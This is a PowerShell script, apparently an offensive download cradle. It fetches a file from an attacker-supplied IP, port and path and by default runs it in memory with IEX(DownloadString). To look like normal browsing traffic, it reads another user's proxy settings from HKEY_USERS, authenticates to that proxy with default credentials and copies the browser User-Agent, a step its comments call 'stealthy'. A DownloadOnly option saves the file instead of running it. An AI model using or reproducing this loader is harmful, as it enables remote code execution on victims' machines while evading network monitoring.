param(
    [string]$ip,
    [int]$port,
    [string]$app,
    [switch]$verbose,
    [switch]$DownloadOnly
)

# Mount HKU for accessing other user hives
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue | Out-Null

# Get first real user SID
$keys = Get-ChildItem 'HKU:\'
foreach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.Substring(10)
        break
    }
}

# Try fetching proxy address
try {
    $proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
} catch {
    $proxyAddr = $null
}

# Prepare download URL
$url = "http://{0}:{1}/{2}" -f $ip, $port, $app
$wc = New-Object System.Net.WebClient

# Stealthy proxy behavior
if ($proxyAddr -and $proxyAddr -ne "") {
    try {
        $proxy = New-Object System.Net.WebProxy("http://$proxyAddr")
        $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        $wc.Proxy = $proxy
        if ($verbose) { Write-Host "[*] Using proxy: $proxyAddr" }
    } catch {
        Write-Warning "[-] Invalid proxy configuration. Falling back to direct connection."
        $wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
    }
} else {
    $wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
    if ($verbose) { Write-Host "[*] No proxy configured, connecting directly" }
}

# Function to detect best User-Agent
function Get-UserAgent {
    try {
        $uaReg = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\User Agent" -ErrorAction Stop
        if ($uaReg."User Agent") {
            return $uaReg."User Agent"
        }
    } catch {
        if ($verbose) { Write-Host "[*] User-Agent registry key not found, skipping..." }
    }

    $chromePrefsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
    if (Test-Path $chromePrefsPath) {
        $prefs = Get-Content $chromePrefsPath -Raw
        if ($prefs -match '"user_agent":"([^"]+)"') {
            return $matches[1]
        }
    }

    $edgePrefsPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Preferences"
    if (Test-Path $edgePrefsPath) {
        $prefs = Get-Content $edgePrefsPath -Raw
        if ($prefs -match '"user_agent":"([^"]+)"') {
            return $matches[1]
        }
    }

    $browserProc = Get-Process | Where-Object { $_.Name -match "chrome|firefox|msedge" } | Select-Object -First 1
    switch ($browserProc.Name) {
        "chrome" {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        "firefox" {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"
        }
        "msedge" {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        }
    }

    # Fallback
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
}

# Set User-Agent
$ua = Get-UserAgent
$wc.Headers.Add("User-Agent", $ua)

# Download or Execute
try {
    if ($verbose) {
        Write-Host "[*] Downloading from $url"
    }

    if ($DownloadOnly) {
        $desktopPath = [Environment]::GetFolderPath("Desktop")
        $destPath = Join-Path -Path (Get-Location) -ChildPath $app
        $wc.DownloadFile($url, $destPath)
        Write-Host "[+] Downloaded to: $destPath"
        Write-Host "[!] Please review the file before executing manually."
    } else {
        IEX ($wc.DownloadString($url))
    }
} catch {
    Write-Error "[-] Failed: $_"
}
